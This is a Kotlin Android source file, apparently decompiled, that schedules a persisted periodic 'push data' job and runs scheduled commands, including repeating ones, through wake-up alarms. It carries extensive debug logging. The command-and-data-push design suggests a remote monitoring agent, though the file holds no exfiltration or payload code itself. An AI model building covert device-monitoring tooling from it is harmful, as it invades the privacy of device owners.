package com.hawkshaw.library.handler

import android.app.AlarmManager
import android.app.PendingIntent
import android.app.job.JobInfo
import android.app.job.JobScheduler
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.os.Build
import com.hawkshaw.library.App
import com.hawkshaw.library.datalayer.models.Command
import com.hawkshaw.library.datalayer.network.twirp.interceptors.ContentNegotiationInterceptorKt
import com.hawkshaw.library.handler.AlarmReceiver
import com.hawkshaw.library.logger.Logger
import kotlinx.serialization.encodeToString
import android.util.Log // Added for logging
import androidx.annotation.RequiresApi

object JobScheduler {
    private const val TAG = "JobScheduler"
    private const val ALARM_REQUEST_CODE = 1234
    
    // Use the JOB_ID_SCHEDULER constant from SchedulerJobService
    // This ensures we're using a consistent job ID across the app
    private const val JOB_ID = JOB_ID_SCHEDULER
    
    private const val DEFAULT_INTERVAL = 28800000L // 8 hours
    private const val MIN_INTERVAL = 900000L // 15 minutes
    private const val PENDING_INTENT_FLAGS = PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE

    private fun getContext(): Context {
        Log.d(TAG, "[DEBUG] getContext called.") // Can be noisy, typically not needed for such a simple getter
        return App.getContext()
    }

    private fun scheduleAlarm(delay: Long) {
        Log.d(TAG, "[DEBUG] scheduleAlarm called with delay: $delay ms")
        val context = getContext()
        Log.d(TAG, "[DEBUG] scheduleAlarm: Got context: $context")
        val alarmManager = context.getSystemService(Context.ALARM_SERVICE) as AlarmManager
        Log.d(TAG, "[DEBUG] scheduleAlarm: Got AlarmManager instance.")
        val intent = Intent(context, AlarmReceiver::class.java).apply {
            putExtra("source", "ScheduleAlarm")
        }
        Log.d(TAG, "[DEBUG] scheduleAlarm: Created Intent with source 'ScheduleAlarm'. Target: AlarmReceiver")
        val pendingIntent = PendingIntent.getBroadcast(
            context,
            ALARM_REQUEST_CODE,
            intent,
            PENDING_INTENT_FLAGS
        )
        Log.d(TAG, "[DEBUG] scheduleAlarm: Created PendingIntent with requestCode $ALARM_REQUEST_CODE, flags $PENDING_INTENT_FLAGS.")

        val triggerAtMillis = System.currentTimeMillis() + delay + 1000
        Log.d(TAG, "[DEBUG] scheduleAlarm: Setting exact and allow while idle. TriggerAtMillis: $triggerAtMillis (Current: ${System.currentTimeMillis()}, Delay: $delay)")
        alarmManager.setExactAndAllowWhileIdle(
            AlarmManager.RTC_WAKEUP,
            triggerAtMillis,
            pendingIntent
        )
        Log.d(TAG, "[DEBUG] scheduleAlarm: Alarm set.")
    }

    @RequiresApi(Build.VERSION_CODES.O)
    private fun scheduleJob(delay: Long) {
        Log.d(TAG, "[DEBUG] scheduleJob called with delay: $delay ms")
        val context = getContext()
        Log.d(TAG, "[DEBUG] scheduleJob: Got context: $context")
        val jobScheduler = context.getSystemService(Context.JOB_SCHEDULER_SERVICE) as JobScheduler
        Log.d(TAG, "[DEBUG] scheduleJob: Got JobScheduler instance.")

        val componentName = ComponentName(context.packageName, SchedulerJobService::class.java.name)
        Log.d(TAG, "[DEBUG] scheduleJob: Created ComponentName: $componentName")

        val jobInfoBuilder = JobInfo.Builder(JOB_ID, componentName)
            .setRequiresBatteryNotLow(true)
            .setRequiredNetworkType(JobInfo.NETWORK_TYPE_ANY)
            .setMinimumLatency(delay)
            .setOverrideDeadline(delay * 2) // Using delay * 2 as deadline
            .setPersisted(true)
        Log.d(TAG, "[DEBUG] scheduleJob: JobInfo.Builder configured. JobId: $JOB_ID, MinLatency: $delay, OverrideDeadline: ${delay * 2}")

        val jobInfo = jobInfoBuilder.build()
        Log.d(TAG, "[DEBUG] scheduleJob: JobInfo built.")

        val result = jobScheduler.schedule(jobInfo)
        Logger.v(TAG, "JobSchedulerResult: $result", false, 4, null)
        Log.d(TAG, "[DEBUG] scheduleJob: jobScheduler.schedule result: $result (1=SUCCESS, 0=FAILURE/CANCELLED)")
    }

    @RequiresApi(Build.VERSION_CODES.O)
    @JvmOverloads
    fun startScheduler(request: Command.StartRepeatPushDataRequest? = null) {
        val intervalMillis = request?.intervalMillis ?: DEFAULT_INTERVAL
        Log.d(TAG, "[DEBUG] startScheduler called. Request provided: ${request != null}, Resolved IntervalMillis: $intervalMillis ms (Default was $DEFAULT_INTERVAL)")

        Log.d(TAG, "[DEBUG] startScheduler: Calling stopScheduler() first.")
        stopScheduler()

        Log.d(TAG, "[DEBUG] startScheduler: Calling scheduleJob() with intervalMillis: $intervalMillis")
        scheduleJob(intervalMillis)

        Log.d(TAG, "[DEBUG] startScheduler: Calling scheduleAlarm() with intervalMillis: $intervalMillis")
        scheduleAlarm(intervalMillis)
        Log.d(TAG, "[DEBUG] startScheduler completed.")
    }

    fun stopScheduler() {
        Log.d(TAG, "[DEBUG] stopScheduler called.")
        val context = getContext()
        Log.d(TAG, "[DEBUG] stopScheduler: Got context: $context")

        // Cancel alarm
        val alarmManager = context.getSystemService(Context.ALARM_SERVICE) as AlarmManager
        Log.d(TAG, "[DEBUG] stopScheduler: Got AlarmManager instance for cancelling alarm.")
        val alarmIntent = Intent(context, AlarmReceiver::class.java)
        Log.d(TAG, "[DEBUG] stopScheduler: Created Intent for AlarmReceiver to cancel.")
        val alarmPendingIntent = PendingIntent.getBroadcast(
            context,
            ALARM_REQUEST_CODE,
            alarmIntent,
            PENDING_INTENT_FLAGS // Ensure flags match for cancellation
        )
        Log.d(TAG, "[DEBUG] stopScheduler: Created PendingIntent for alarm cancellation. RequestCode: $ALARM_REQUEST_CODE")
        alarmManager.cancel(alarmPendingIntent)
        Log.d(TAG, "[DEBUG] stopScheduler: Alarm cancelled using AlarmManager.")

        // Cancel job
        val jobScheduler = context.getSystemService(Context.JOB_SCHEDULER_SERVICE) as JobScheduler
        Log.d(TAG, "[DEBUG] stopScheduler: Got JobScheduler instance for cancelling job.")
        jobScheduler.cancel(JOB_ID)
        Log.d(TAG, "[DEBUG] stopScheduler: Job cancelled using JobScheduler with JobId: $JOB_ID")
        Log.d(TAG, "[DEBUG] stopScheduler completed.")
    }

    fun cancelScheduledCommand(request: Command.CancelScheduledCommandRequest) {
        Log.d(TAG, "[DEBUG] cancelScheduledCommand called. Request codes: ${request.requestCodes}")
        val context = getContext()
        Log.d(TAG, "[DEBUG] cancelScheduledCommand: Got context: $context")
        val alarmManager = context.getSystemService(Context.ALARM_SERVICE) as AlarmManager
        Log.d(TAG, "[DEBUG] cancelScheduledCommand: Got AlarmManager instance.")

        request.requestCodes.forEach { requestCode ->
            Log.d(TAG, "[DEBUG] cancelScheduledCommand: Processing requestCode: $requestCode")
            val intent = Intent(context, AlarmReceiver::class.java).apply {
                action = AlarmReceiver.ACTION_SCHEDULE_COMMAND
            }
            Log.d(TAG, "[DEBUG] cancelScheduledCommand: Created Intent with action '${AlarmReceiver.ACTION_SCHEDULE_COMMAND}' for requestCode $requestCode.")
            val pendingIntent = PendingIntent.getBroadcast(
                context,
                requestCode.toInt(),
                intent,
                PENDING_INTENT_FLAGS // Ensure flags match for cancellation
            )
            Log.d(TAG, "[DEBUG] cancelScheduledCommand: Created PendingIntent for requestCode $requestCode.")
            alarmManager.cancel(pendingIntent)
            Log.d(TAG, "[DEBUG] cancelScheduledCommand: Alarm cancelled for requestCode $requestCode.")
        }
        Log.d(TAG, "[DEBUG] cancelScheduledCommand completed for all request codes.")
    }

    fun scheduleCommand(request: Command.ScheduleCommandRequest) {
        Log.d(TAG, "[DEBUG] scheduleCommand called. RequestCode: ${request.requestCode}, TriggerAt: ${request.triggerAt}, Interval: ${request.interval}, Command: ${request.command.type}")
        val context = getContext()
        Log.d(TAG, "[DEBUG] scheduleCommand: Got context: $context")
        val alarmManager = context.getSystemService(Context.ALARM_SERVICE) as AlarmManager
        Log.d(TAG, "[DEBUG] scheduleCommand: Got AlarmManager instance.")

        val commandJsonString = ContentNegotiationInterceptorKt.json.encodeToString(request.command)
        Log.d(TAG, "[DEBUG] scheduleCommand: Encoded command to JSON string (length: ${commandJsonString.length}).")

        val intent = Intent(context, AlarmReceiver::class.java).apply {
            action = AlarmReceiver.ACTION_SCHEDULE_COMMAND
            putExtra("source", "ScheduleAlarm_scheduleCommand") // Differentiated source for clarity
            putExtra("command", commandJsonString)
        }
        Log.d(TAG, "[DEBUG] scheduleCommand: Created Intent with action '${AlarmReceiver.ACTION_SCHEDULE_COMMAND}', source 'ScheduleAlarm_scheduleCommand', and command extra.")

        val pendingIntent = PendingIntent.getBroadcast(
            context,
            request.requestCode.toInt(),
            intent,
            PENDING_INTENT_FLAGS
        )
        Log.d(TAG, "[DEBUG] scheduleCommand: Created PendingIntent with requestCode ${request.requestCode.toInt()}.")

        if (request.interval > 0) {
            val intervalMillis = if (request.interval >= MIN_INTERVAL) request.interval else MIN_INTERVAL
            Log.d(TAG, "[DEBUG] scheduleCommand: Scheduling repeating alarm. OriginalInterval: ${request.interval}, AdjustedIntervalMillis: $intervalMillis (MIN_INTERVAL: $MIN_INTERVAL), TriggerAt: ${request.triggerAt}")
            alarmManager.setRepeating(
                AlarmManager.RTC_WAKEUP,
                request.triggerAt,
                intervalMillis,
                pendingIntent
            )
            Log.d(TAG, "[DEBUG] scheduleCommand: Repeating alarm set.")
        } else {
            Log.d(TAG, "[DEBUG] scheduleCommand: Scheduling exact alarm. TriggerAt: ${request.triggerAt}")
            alarmManager.setExact(
                AlarmManager.RTC_WAKEUP,
                request.triggerAt,
                pendingIntent
            )
            Log.d(TAG, "[DEBUG] scheduleCommand: Exact alarm set.")
        }
        Log.d(TAG, "[DEBUG] scheduleCommand completed for requestCode ${request.requestCode}.")
    }
}
